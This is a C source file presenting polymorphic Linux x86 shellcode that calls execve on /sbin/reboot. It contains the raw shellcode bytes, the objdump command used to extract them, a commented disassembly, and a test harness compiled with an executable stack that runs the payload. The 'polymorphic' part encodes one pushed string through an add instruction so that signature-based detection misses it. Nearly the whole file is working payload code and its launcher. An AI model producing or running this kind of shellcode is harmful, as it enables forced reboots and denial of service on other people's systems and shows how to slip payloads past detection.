/* Polymorphic   Linux x86 PUSH reboot() */
/*
$ echo `objdump -d reboot  | grep -v file | grep '[0-9a-f]:' | cut  -f 2 ` | sed 's/ /\\x/g' | sed 's/^/\\x/g'
\x31\xc0\x50\x68\x62\x6f\x6f\x74\xbf\x0e\x0f\x02\x05\x81\xc7\x60\x20\x70\x60\x57\x68\x2f\x73\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\x6a\x0a\x58\x04\x01\xcd\x80
*/

/* 
 * Test
 * $ gcc -Wall -z execstack  reboot.c 
 * $ ./a.out 
 * Size: 41 bytes (original size was 30 => 136 %)
 * $    
 */

/* 
Disassembly of section .text:

08048080 <_start>:
 8048080:	31 c0                	xor    eax,eax
 8048082:	50                   	push   eax
 8048083:	68 62 6f 6f 74       	push   0x746f6f62
 8048088:	bf 0e 0f 02 05       	mov    edi,0x5020f0e
 804808d:	81 c7 60 20 70 60    	add    edi,0x60702060
 8048093:	57                   	push   edi
 8048094:	68 2f 73 62 69       	push   0x6962732f
 8048099:	89 e3                	mov    ebx,esp
 804809b:	50                   	push   eax
 804809c:	89 e2                	mov    edx,esp
 804809e:	53                   	push   ebx
 804809f:	89 e1                	mov    ecx,esp
 80480a1:	6a 0a                	push   0xa
 80480a3:	58                   	pop    eax
 80480a4:	04 01                	add    al,0x1
 80480a6:	cd 80                	int    0x80

*/

#include <stdio.h>

char shellcode[]=
"\x31\xc0\x50\x68\x62\x6f\x6f\x74\xbf\x0e\x0f\x02\x05\x81\xc7\x60\x20\x70\x60"
"\x57\x68\x2f\x73\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\x6a\x0a\x58\x04\x01"
"\xcd\x80";

typedef int (*func_ptr)();
int main()
{
        printf("Size: %d bytes.\n", sizeof(shellcode)); 
        ((func_ptr) shellcode)();
        return 0;
}
